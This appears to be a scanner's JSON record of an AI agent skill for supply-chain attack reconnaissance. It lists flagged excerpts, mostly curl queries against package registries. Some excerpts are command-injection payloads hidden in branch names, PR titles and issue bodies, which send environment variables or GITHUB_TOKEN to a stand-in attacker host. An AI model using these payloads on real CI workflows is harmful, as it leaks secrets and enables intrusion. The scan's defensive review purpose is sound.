@@ -1,0 +1,444 @@
+{
+  "id": "elementalsouls__claude-bughunter__skills~supply-chain-attack-recon",
+  "owner": "elementalsouls",
+  "repo": "Claude-BugHunter",
+  "path": "skills/supply-chain-attack-recon",
+  "name": "supply-chain-attack-recon",
+  "description": "External recon for software supply-chain attack surface — package-namespace squatting candidates, dependency-confusion vulnerabilities, GitHub Actions injection openings, container image registry exposure, SBOM mining, internal-package-name leakage, and CI/CD configuration exposure. Reconnaissance and identification ONLY — actual package publishing / typosquat attacks are EXTERNAL-OFFENSIVE and require explicit written sign-off because they can affect the entire npm/PyPI ecosystem. Use when the target has a public GitHub org, when their build artifacts/SBOMs are reachable, when their docker images are on Docker Hub/GHCR, or when you find internal package names in their JS bundles.",
+  "stars": 5465,
+  "category": "security",
+  "commit": "3e71af03d48b7bca94a815cfff97431f932748d0",
+  "contentHash": "cf0f8226f4ef432caea5a526acdd2d992313391dc401d3176c3f0d5846dceca0",
+  "repoCreatedAt": "2026-05-05T11:22:32Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-06T19:07:48.007Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 44,
+        "excerpt": "TARGET=\"<brand>\"  # set to target brand name",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 48,
+        "excerpt": "curl -sI \"https://github.com/$guess\" | grep -E \"HTTP|status\" | head -1",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "github.com"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 63,
+        "excerpt": "ORG=\"targetorg\"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 82,
+        "excerpt": "# JS bundles are the easiest source of internal npm names",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 83,
+        "excerpt": "curl -sk https://target.com/main.js | grep -oE '@[a-z-]+/[a-z-]+' | sort -u",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 84,
+        "excerpt": "curl -sk https://target.com/main.js | grep -oE 'require\\(\"[^\"]+\"\\)' | sort -u",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 88,
+        "excerpt": "status=$(curl -sI \"https://registry.npmjs.org/$pkg\" | head -1 | awk '{print $2}')",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "registry.npmjs.org"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 97,
+        "excerpt": "# Public repos with package.json that reference internal scopes",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 107,
+        "excerpt": "# Internal pip package names",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 120,
+        "excerpt": "NAME=\"@target-internal/utils\"   # example",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 123,
+        "excerpt": "curl -sI \"https://registry.npmjs.org/$NAME\" | head -1",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "registry.npmjs.org"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 128,
+        "excerpt": "curl -sI \"https://pypi.org/project/$NAME/\" | head -1",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "pypi.org"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 132,
+        "excerpt": "curl -sI \"https://rubygems.org/api/v1/gems/$NAME.json\" | head -1",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "rubygems.org"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 136,
+        "excerpt": "curl -sI \"https://proxy.golang.org/github.com/$ORG/$NAME/@latest\" | head -1",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "proxy.golang.org"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 153,
+        "excerpt": "# Common typosquat patterns:",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 175,
+        "excerpt": "status=$(curl -sI \"https://registry.npmjs.org/$candidate\" | head -1 | awk '{print $2}')",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "registry.npmjs.org"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 189,
+        "excerpt": "for repo in $(gh repo list \"$ORG\" --limit 50 --json name --jq '.[].name'); do",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 234,
+        "excerpt": "# Malicious branch name (test in a fork PR):",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 235,
+        "excerpt": "git checkout -b 'feat/x\"; curl https://attacker/?d=$(env | base64);\"'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "attacker"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 236,
+        "excerpt": "git push origin 'feat/x\"; curl https://attacker/?d=$(env | base64);\"'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "attacker"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 239,
+        "excerpt": "PR_TITLE='x\"; curl https://attacker/?d=$(echo $GITHUB_TOKEN | base64);\"'",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 239,
+        "excerpt": "PR_TITLE='x\"; curl https://attacker/?d=$(echo $GITHUB_TOKEN | base64);\"'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "attacker"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 242,
+        "excerpt": "ISSUE_BODY='x\"; curl https://attacker/?leak=$(git config user.name);\"'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "attacker"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 252,
+        "excerpt": "# List all Action runs for a repo",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 269,
+        "excerpt": "# Install zizmor (Rust-based, from https://github.com/woodruffw/zizmor)",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 270,
+        "excerpt": "cargo install zizmor",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 286,
+        "excerpt": "# Docker Hub",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 287,
+        "excerpt": "curl -s \"https://hub.docker.com/v2/repositories/$ORG/?page_size=100\" | jq -r '.results[].name'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "hub.docker.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 295,
+        "excerpt": "curl -s \"https://hub.docker.com/v2/repositories/$ORG/$img/tags?page_size=20\" | jq -r '.results[].name'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "hub.docker.com"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 315,
+        "excerpt": "# Look for SBOMs published as releases (SPDX, CycloneDX format)",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 323,
+        "excerpt": "curl -s \"https://api.osv.dev/v1/query\" -d '{\"package\": {\"name\": \"lodash\", \"ecosystem\": \"npm\"}, \"version\": \"4.17.10\"}'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "api.osv.dev"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 331,
+        "excerpt": "# .npmrc patterns",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 352,
+        "excerpt": "# Some orgs maintain a public npm scope mirroring their brand",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 353,
+        "excerpt": "curl -s \"https://registry.npmjs.org/-/v1/search?text=scope:$ORG&size=50\" | jq '.objects[].package.name'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "registry.npmjs.org"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 356,
+        "excerpt": "curl -s \"https://pypi.org/simple/\" | grep \"$ORG\" | head -20",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "pypi.org"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 360,
+        "excerpt": "curl -sI \"https://registry.npmjs.org/-/org/$ORG\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "registry.npmjs.org"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 372,
+        "excerpt": "# Detect usage of polyfill.io and similar historically-compromised services",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 373,
+        "excerpt": "curl -s https://target.com | grep -i polyfill",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com"
+        ]
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 512,
+        "excerpt": "- **Impact:** Every CI run worldwide that piped `curl -s https://codecov.io/bash | bash` for 2 months exfiltrated env vars. Confirmed downstream victims: HashiC",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 518,
+        "excerpt": "- **Recon takeaway:** \"Curl-bash-install\" patterns in public CI workflows are gold for this recon skill — search `.github/workflows/` for `curl ... | bash`, `wg",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 635,
+        "excerpt": "- **Pinning to mutable references is the recurring failure** — `curl | bash` (Codecov), `@v35` action tags (tj-actions), `^1.0.0` semver (Birsan, event-stream).",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 644,
+        "excerpt": "- **`hunt-rce`** — Dependency confusion lands as RCE on whatever runner installs the package; CI runners are the highest-value target. Chain primitive: internal",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/supply-chain-attack-recon/SKILL.md",
+        "line": 645,
+        "excerpt": "- **`cloud-iam-deep`** — CI runners have IAM credentials; supply-chain RCE there is a credential-exfil bonanza. Chain primitive: malicious package executes on G",
+        "disclosed": true,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "shell": 16,
+      "network": 22,
+      "reads-secrets": 2,
+      "downloads-code": 5
+    },
+    "score": 69,
+    "band": "review",
+    "rulesVersion": "1.0.0",
+    "filesScanned": 2,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "3e71af03d48b7bca94a815cfff97431f932748d0",
+      "scannedAt": "2026-11-06T19:07:48.007Z",
+      "score": 69,
+      "rulesVersion": "1.0.0"
+    }
+  ]
+}
